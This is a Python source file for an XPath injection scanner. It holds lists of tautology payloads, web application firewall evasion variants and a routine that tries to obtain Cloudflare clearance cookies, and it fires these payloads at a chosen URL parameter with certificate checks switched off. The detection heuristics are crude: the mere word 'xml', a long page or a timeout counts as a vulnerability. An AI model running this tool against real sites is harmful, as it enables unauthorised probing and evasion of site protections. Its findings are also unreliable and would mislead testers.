import requests
import urllib.parse
import time
import random
import re
from bs4 import BeautifulSoup

class XPathInjectionScanner:
    def __init__(self):
        self.options = {
            "URL": "",
            "PARAM": "",
            "METHOD": "GET",
            "TIMEOUT": "10",
            "DELAY": "0",
            "COOKIE": "",
            "USER_AGENT": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "HEADERS": "",
            "CF_BYPASS": False,
            "WAF_BYPASS": False,
            "RANDOM_CASE": False,
            "RANDOM_SPACE": False,
            "COMMENT_BYPASS": False,
            "HEX_ENCODE": False,
            "URL_ENCODE": True
        }
        
        self.payloads = [
            "' or '1'='1",
            "' or 1=1",
            "' or 'a'='a",
            "' or 'x'='x",
            "' or 1=1 or '1'='1",
            "' or '1'='1' or '1'='1",
            "' or 1=1 and '1'='1",
            "' or 'a'='a' and 'b'='b",
            "' or 'x'='x' and 'y'='y",
            "' or 1=1 or 'a'='a",
            "' or '1'='1' or 'a'='a",
            "' or 1=1 and 'a'='a",
            "' or 'a'='a' and 'b'='b",
            "' or 'x'='x' and 'y'='y",
            "' or 1=1 or 1=1",
            "' or '1'='1' or '1'='1",
            "' or 1=1 and 1=1",
            "' or 'a'='a' and 'b'='b",
            "' or 'x'='x' and 'y'='y",
            "' or 1=1 or 'x'='x",
            "' or '1'='1' or 'x'='x",
            "' or 1=1 and 'x'='x",
            "' or 'a'='a' and 'x'='x",
            "' or 'x'='x' and 'x'='x"
        ]
        
        self.error_patterns = [
            "xpath",
            "xml",
            "xpath syntax",
            "xpath error",
            "xml parsing",
            "xpath evaluation",
            "xpath query",
            "xpath expression",
            "xpath exception",
            "xpath warning",
            "xpath fatal",
            "xpath parse",
            "xpath invalid",
            "xpath failed",
            "xpath cannot",
            "xpath unexpected",
            "xpath unknown",
            "xpath illegal",
            "xpath malformed",
            "xpath unclosed",
            "xpath unterminated"
        ]
        
        self.waf_bypass_payloads = [
            "' oR '1'='1",
            "' Or '1'='1",
            "' oR 1=1",
            "' Or 1=1",
            "'/**/OR/**/'1'='1",
            "'/**/OR/**/1=1",
            "'%20OR%201=1",
            "'+OR+'1'='1",
            "'||'1'='1",
            "'|'1'='1",
            "' oR 'a'='a",
            "' Or 'a'='a",
            "'/**/OR/**/'a'='a",
            "'/**/OR/**/'a'='a",
            "'%20OR%20'a'='a",
            "'+OR+'a'='a",
            "'||'a'='a",
            "'|'a'='a",
            "' oR 'x'='x",
            "' Or 'x'='x",
            "'/**/OR/**/'x'='x",
            "'/**/OR/**/'x'='x",
            "'%20OR%20'x'='x",
            "'+OR+'x'='x",
            "'||'x'='x",
            "'|'x'='x"
        ]
        
        self.cf_bypass_payloads = [
            "' or '1'='1",
            "' or 1=1",
            "' or 'a'='a",
            "' or 'x'='x",
            "' or 1=1 or '1'='1",
            "' or '1'='1' or '1'='1",
            "' or 1=1 and '1'='1",
            "' or 'a'='a' and 'b'='b",
            "' or 'x'='x' and 'y'='y",
            "' or 1=1 or 'a'='a",
            "' or '1'='1' or 'a'='a",
            "' or 1=1 and 'a'='a",
            "' or 'a'='a' and 'b'='b",
            "' or 'x'='x' and 'y'='y",
            "' or 1=1 or 1=1",
            "' or '1'='1' or '1'='1",
            "' or 1=1 and 1=1",
            "' or 'a'='a' and 'b'='b",
            "' or 'x'='x' and 'y'='y",
            "' or 1=1 or 'x'='x",
            "' or '1'='1' or 'x'='x",
            "' or 1=1 and 'x'='x",
            "' or 'a'='a' and 'x'='x",
            "' or 'x'='x' and 'x'='x"
        ]
    
    def set_option(self, key, value):
        self.options[key] = value
    
    def get_option(self, key):
        return self.options[key]
    
    def process_payload(self, payload):
        if self.get_option("RANDOM_CASE"):
            payload = self.random_case(payload)
        
        if self.get_option("RANDOM_SPACE"):
            payload = self.random_space(payload)
        
        if self.get_option("COMMENT_BYPASS"):
            payload = self.comment_bypass(payload)
        
        if self.get_option("HEX_ENCODE"):
            payload = self.hex_encode(payload)
        
        if self.get_option("URL_ENCODE"):
            payload = urllib.parse.quote(payload)
        
        return payload
    
    def random_case(self, payload):
        return ''.join(random.choice([c.upper(), c.lower()]) if c.isalpha() else c for c in payload)
    
    def random_space(self, payload):
        result = []
        for c in payload:
            result.append(c)
            if c == ' ' and random.random() > 0.5:
                result.append(random.choice([' ', '/**/', '%20', '+']))
        return ''.join(result)
    
    def comment_bypass(self, payload):
        return payload.replace(' ', '/**/')
    
    def hex_encode(self, payload):
        return '0x' + payload.encode('utf-8').hex()
    
    def get_cloudflare_cookies(self, url):
        try:
            session = requests.Session()
            response = session.get(url, timeout=int(self.get_option("TIMEOUT")), verify=False)
            
            if 'cf_clearance' in response.cookies:
                return {'cf_clearance': response.cookies.get('cf_clearance')}
            
            soup = BeautifulSoup(response.text, 'html.parser')
            js_challenge = soup.find('script', string=re.compile('setTimeout'))
            
            if js_challenge:
                time.sleep(5)
                response = session.get(url, timeout=int(self.get_option("TIMEOUT")), verify=False)
                if 'cf_clearance' in response.cookies:
                    return {'cf_clearance': response.cookies.get('cf_clearance')}
            
            return None
        except:
            return None
    
    def run(self):
        url = self.get_option("URL")
        param = self.get_option("PARAM")
        method = self.get_option("METHOD").upper()
        timeout = int(self.get_option("TIMEOUT"))
        delay = int(self.get_option("DELAY"))
        
        headers = {
            "User-Agent": self.get_option("USER_AGENT"),
            "Cookie": self.get_option("COOKIE")
        }
        
        if self.get_option("HEADERS"):
            try:
                for header in self.get_option("HEADERS").split("\\n"):
                    if ":" in header:
                        key, value = header.split(":", 1)
                        headers[key.strip()] = value.strip()
            except:
                pass
        
        cookies = {}
        
        if self.get_option("CF_BYPASS"):
            cf_cookies = self.get_cloudflare_cookies(url)
            if cf_cookies:
                cookies.update(cf_cookies)
        
        vulnerabilities = []
        
        payloads_to_test = self.payloads
        
        if self.get_option("WAF_BYPASS"):
            payloads_to_test = self.waf_bypass_payloads
        
        if self.get_option("CF_BYPASS"):
            payloads_to_test = self.cf_bypass_payloads
        
        for i, payload in enumerate(payloads_to_test, 1):
            if delay > 0:
                time.sleep(delay)
            
            processed_payload = self.process_payload(payload)
            
            vulnerable, vuln_type = self.test_payload(url, param, processed_payload, method, timeout, headers, cookies)
            
            if vulnerable:
                vulnerabilities.append({
                    "payload": payload,
                    "type": vuln_type,
                    "parameter": param
                })
        
        if vulnerabilities:
            return {
                "success": True,
                "message": f"Found {len(vulnerabilities)} vulnerabilities",
                "vulnerabilities": vulnerabilities
            }
        else:
            return {
                "success": True,
                "message": "No vulnerabilities found"
            }
    
    def test_payload(self, url, param, payload, method, timeout, headers, cookies):
        try:
            if method == "GET":
                test_url = f"{url}?{param}={payload}"
                response = requests.get(test_url, timeout=timeout, verify=False, headers=headers, cookies=cookies)
            else:
                data = {param: payload}
                response = requests.post(url, data=data, timeout=timeout, verify=False, headers=headers, cookies=cookies)
            
            for pattern in self.error_patterns:
                if pattern.lower() in response.text.lower():
                    return True, "Error-based XPathi"
            
            if len(response.text) > 10000:
                return True, "XPathi (suspected)"
            
        except requests.exceptions.Timeout:
            return True, "Time-based XPathi"
        except Exception:
            pass
        
        return False, None
